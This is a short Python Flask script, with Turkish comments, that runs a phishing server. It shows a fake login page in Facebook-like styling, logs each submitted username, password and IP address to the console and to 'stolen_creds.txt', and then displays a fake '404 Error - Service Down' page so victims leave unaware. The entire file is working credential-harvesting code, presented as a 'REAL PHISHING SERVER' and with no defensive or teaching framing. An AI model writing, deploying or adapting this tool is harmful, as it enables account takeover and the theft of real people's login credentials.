from flask import Flask, request, render_template_string
import datetime

app = Flask(__name__)

# Sahte Giriş Sayfası (HTML)
FAKE_PAGE = """
<html>
<head><title>Login Security Check</title></head>
<body style="background:#f0f2f5; font-family:sans-serif; text-align:center; padding-top:50px;">
    <div style="background:white; width:300px; margin:auto; padding:20px; border-radius:8px; box-shadow:0 0 10px #ccc;">
        <h2 style="color:#1877f2;">Login</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Email or Phone" style="width:100%; padding:10px; margin-bottom:10px;"><br>
            <input type="password" name="password" placeholder="Password" style="width:100%; padding:10px; margin-bottom:10px;"><br>
            <button type="submit" style="width:100%; padding:10px; background:#1877f2; color:white; border:none; font-weight:bold;">Log In</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET'])
def index():
    return render_template_string(FAKE_PAGE)

@app.route('/login', methods=['POST'])
def login():
    user = request.form['username']
    pwd = request.form['password']
    ip = request.remote_addr
    
    # Şifreyi Yakala
    print(f"\n[🔥] YAKALANDI! IP: {ip} | User: {user} | Pass: {pwd}")
    
    with open("stolen_creds.txt", "a") as f:
        f.write(f"{datetime.datetime.now()} - {ip} - {user}:{pwd}\n")
        
    return "<h1>404 Error - Service Down</h1>" # Kurban hata sanıp çıkar

if __name__ == '__main__':
    print("--- REAL PHISHING SERVER STARTED on Port 80 ---")
    app.run(host='0.0.0.0', port=80)